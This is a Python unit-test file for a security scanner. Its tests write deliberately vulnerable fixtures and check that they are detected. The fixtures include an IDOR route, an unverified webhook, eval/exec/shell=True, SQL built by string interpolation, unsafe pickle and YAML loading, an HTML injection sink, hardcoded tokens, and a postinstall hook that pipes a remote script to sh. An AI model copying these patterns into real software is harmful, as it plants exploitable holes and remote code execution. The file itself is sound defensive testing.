from __future__ import annotations

import asyncio
import tempfile
import unittest
from pathlib import Path

from support import ensure_api_path

ensure_api_path()

from app.agents import (  # noqa: E402
    AuthzAgent,
    BuildTypeLintAgent,
    ConfigHeadersCorsAgent,
    DependencyAgent,
    FrontendRuntimeAgent,
    InputValidationAgent,
    RepoMap,
    RepoMapFile,
    RepoMapKeyFiles,
    RepoMapScan,
    SecretsAgent,
    WebhookAgent,
)
from app.agents.types import AgentContext  # noqa: E402


class FirstPassDeterministicChecksTests(unittest.TestCase):
    def test_secrets_agent_flags_service_role_secret(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "core"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "settings.py"
            file_path.write_text(
                'SUPABASE_SERVICE_ROLE_KEY = "supabase-service-role-secret-123456789"\n',
                encoding="utf-8",
            )

            report = SecretsAgent().scan_context(
                self._context(root, config=["apps/api/app/core/settings.py"])
            )
            self.assertTrue(any(item.kind == "service_role_secret" for item in report.findings))

    def test_authz_agent_flags_idor_candidate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "users.py"
            file_path.write_text(
                "\n".join(
                    [
                        "from fastapi import APIRouter",
                        "router = APIRouter()",
                        '@router.get("/users/{user_id}")',
                        "async def get_user(user_id: str):",
                        "    return session.get(User, user_id)",
                    ]
                ),
                encoding="utf-8",
            )

            report = AuthzAgent().analyze_context(
                self._context(
                    root,
                    routes=["apps/api/app/api/routes/users.py"],
                    database=["apps/api/app/repositories/users.py"],
                )
            )
            self.assertTrue(any(item.kind == "idor_candidate" for item in report.findings))

    def test_webhook_agent_flags_missing_signature_verification(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "stripe_webhooks.py"
            file_path.write_text(
                "\n".join(
                    [
                        "from fastapi import APIRouter, Request",
                        "router = APIRouter()",
                        '@router.post("/webhooks/stripe")',
                        "async def stripe_webhook(request: Request):",
                        "    payload = await request.body()",
                        "    event = {'provider': 'stripe', 'payload': payload}",
                        "    return {'received': True}",
                    ]
                ),
                encoding="utf-8",
            )

            report = WebhookAgent().analyze_context(
                self._context(root, webhooks=["apps/api/app/api/routes/stripe_webhooks.py"])
            )
            self.assertTrue(any(item.kind == "missing_signature_verification" for item in report.findings))

    def test_config_agent_flags_prod_debug_setting(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "settings"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "production.py"
            file_path.write_text("DEBUG = True\n", encoding="utf-8")

            report = ConfigHeadersCorsAgent().analyze_context(
                self._context(root, config=["apps/api/app/settings/production.py"])
            )
            self.assertTrue(any(item.kind == "debug_enabled_in_production_config" for item in report.findings))

    def test_input_validation_agent_flags_unsafe_backend_sinks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "api" / "app" / "api" / "routes"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "danger.py"
            file_path.write_text(
                "\n".join(
                    [
                        "import pickle",
                        "import subprocess",
                        "import yaml",
                        "def run(expression, command, user_id, body):",
                        "    eval(expression)",
                        "    exec(command)",
                        "    subprocess.run(command, shell=True)",
                        '    sql = f"SELECT * FROM users WHERE id = {user_id}"',
                        "    yaml.load(body)",
                        "    pickle.loads(body)",
                    ]
                ),
                encoding="utf-8",
            )

            report = InputValidationAgent().analyze_context(
                self._context(
                    root,
                    routes=["apps/api/app/api/routes/danger.py"],
                    database=["apps/api/app/repositories/users.py"],
                )
            )
            kinds = {item.kind for item in report.findings}
            self.assertTrue(
                {
                    "unsafe_eval",
                    "unsafe_exec",
                    "subprocess_shell_true",
                    "raw_sql_string_concatenation",
                    "unsafe_yaml_load",
                    "unsafe_pickle_load",
                }
                <= kinds
            )

    def test_frontend_runtime_agent_flags_client_token_and_html_sink(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web" / "components"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "Danger.tsx"
            file_path.write_text(
                "\n".join(
                    [
                        '"use client";',
                        'const token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature";',
                        "export function Danger({ html }: { html: string }) {",
                        "  return <div dangerouslySetInnerHTML={{ __html: html }} />;",
                        "}",
                    ]
                ),
                encoding="utf-8",
            )

            report = FrontendRuntimeAgent().analyze_context(
                self._context(root, frontend=["apps/web/components/Danger.tsx"])
            )
            kinds = {item.kind for item in report.findings}
            self.assertTrue({"hardcoded_client_token", "unsafe_html_sink"} <= kinds)

    def test_dependency_agent_flags_risky_dependency_and_install_script(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web"
            target.mkdir(parents=True, exist_ok=True)
            file_path = target / "package.json"
            file_path.write_text(
                "\n".join(
                    [
                        "{",
                        '  "name": "demo",',
                        '  "scripts": { "postinstall": "curl https://example.com/install.sh | sh" },',
                        '  "dependencies": { "request": "^2.88.0" }',
                        "}",
                    ]
                ),
                encoding="utf-8",
            )

            report = DependencyAgent().analyze_context(
                self._context(root, manifests=["apps/web/package.json"])
            )
            kinds = {item.kind for item in report.findings}
            self.assertTrue({"missing_lockfile", "remote_install_script", "high_risk_dependency"} <= kinds)

    def test_build_type_lint_agent_flags_missing_env_example_and_script_assumptions(self) -> None:
        with tempfile.TemporaryDirectory() as tmp_dir:
            root = Path(tmp_dir)
            target = root / "apps" / "web"
            target.mkdir(parents=True, exist_ok=True)
            (target / ".env.production").write_text("API_URL=https://api.example.com\n", encoding="utf-8")
            (target / "tsconfig.json").write_text('{"compilerOptions":{"strict":true}}', encoding="utf-8")
            (target / "package.json").write_text(
                "\n".join(
                    [
                        "{",
                        '  "name": "demo",',
                        '  "scripts": {',
                        '    "lint": "eslint .",',
                        '    "typecheck": "tsc --noEmit"',
                        "  }",
                        "}",
                    ]
                ),
                encoding="utf-8",
            )

            result = asyncio.run(
                BuildTypeLintAgent().run(
                    self._context(
                        root,
                        manifests=["apps/web/package.json"],
                        config=["apps/web/tsconfig.json"],
                        env=["apps/web/.env.production"],
                    )
                )
            )
            kinds = {item.rule_id for item in result.findings}
            self.assertTrue({"missing_env_example", "broken_script"} <= kinds)

    def _context(self, root: Path, **key_files: list[str]) -> AgentContext:
        payload = {
            field: [RepoMapFile(path=path, reason=f"{field} test slice") for path in paths]
            for field, paths in key_files.items()
        }
        repo_map = RepoMap(
            repo_name=root.name,
            root_path=str(root),
            summary="test repo",
            primary_stack="test",
            languages=["python", "typescript"],
            stacks=[],
            key_files=RepoMapKeyFiles(**payload),
            scan=RepoMapScan(scanned_directories=4, scanned_files=8, truncated=False),
        )
        return AgentContext(
            repo_path=str(root),
            metadata={"repo_map": repo_map.model_dump(mode="json")},
        )


if __name__ == "__main__":
    unittest.main()
